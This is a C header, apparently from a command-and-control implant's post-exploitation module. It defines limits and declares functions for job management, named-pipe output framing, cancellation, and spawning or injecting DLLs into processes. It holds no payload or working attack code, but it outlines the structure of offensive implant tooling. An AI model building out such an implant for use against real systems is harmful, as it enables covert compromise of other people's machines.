#pragma once

#include "beacon_context.h"
#include "beacon_postex.h"
#include "beacon_postex_backend.h"
#include "beacon_commands.h"

#define POSTEX_MAX_READ 65536u
#define POSTEX_MAX_WAIT_MS 10000u
#define POSTEX_POLL_MAX_FRAMES_PER_TICK 64u
#define POSTEX_POLL_MAX_FRAMES_PER_JOB 8u
#define POSTEX_POLL_MAX_BYTES_PER_TICK (512u * 1024u)
#define POSTEX_CANCEL_GRACE_MS 3000u
#define POSTEX_READ_CLOSED -1
#define POSTEX_READ_NONE 0
#define POSTEX_READ_OUTPUT 1
#define POSTEX_READ_DONE 2
#define POSTEX_READ_FRAME 3

static BOOL PostExSetError(CHAR* err, SIZE_T err_size, const CHAR* text)
{
    if (err && err_size) {
        strncpy_s(err, err_size, text ? text : "postex error", _TRUNCATE);
    }
    return FALSE;
}

static BOOL PostExHasError(const CHAR* err)
{
    return err && err[0];
}

const CHAR* PostExSubcmdName(UINT32 subcmd);
const CHAR* PostExCancelReasonName(UINT32 reason);

BOOL PostExProcessExited(PostExJob* job);
VOID PostExCloseJob(PostExJob* job, BOOL kill_process);
PostExJob* PostExFindLocked(PostExManager* pm, UINT32 job_id);
PostExJob* PostExDetachLocked(PostExManager* pm, UINT32 job_id);
SIZE_T PostExJobCountLocked(PostExManager* pm);
BOOL PostExRequestCancelLocked(PostExJob* job, UINT32 reason,
                               ULONGLONG now, BOOL* signaled);
VOID PostExTouchJobActivityLocked(PostExJob* job, ULONGLONG now);
BOOL PostExCanStartJob(struct BeaconContext* ctx, UINT32 task_id,
                       CHAR* err, SIZE_T err_size);
VOID PostExCloseStartedBackend(const PostExStartRequest* req,
                               HANDLE pipe,
                               PostExStartResult* result);
ByteBuf PostExRegisterStartedJob(struct BeaconContext* ctx,
                                 const PostExStartRequest* req,
                                 HANDLE pipe,
                                 PostExStartResult* result);

BOOL PostExBuildPipeName(struct BeaconContext* ctx, UINT32 task_id,
                         CHAR* out, SIZE_T out_size);
BOOL PostExConnectPipe(const CHAR* pipe_name, HANDLE* pipe);
VOID PostExWaitData(HANDLE pipe, DWORD wait_ms);
BOOL PostExReadExact(HANDLE pipe, VOID* data, DWORD len);

INT PostExReadOutput(PostExJob* job, ByteBuf* out,
                     CHAR* done_reason, SIZE_T done_reason_size,
                     UINT32* frame_type, UINT32* frame_flags,
                     UINT32* frame_seq);
ByteBuf PostExMakeOutput(PostExJob* job, const ByteBuf* data);
ByteBuf PostExMakeDead(PostExJob* job, const CHAR* reason);
ByteBuf PostExMakeFrame(PostExJob* job, UINT32 frame_type,
                        UINT32 frame_flags, UINT32 frame_seq,
                        const ByteBuf* data);

ByteBuf PostExSpawnDll(struct BeaconContext* ctx, UINT32 task_id,
                       Parser* parser);
ByteBuf PostExInjectDll(struct BeaconContext* ctx, UINT32 task_id,
                        Parser* parser);
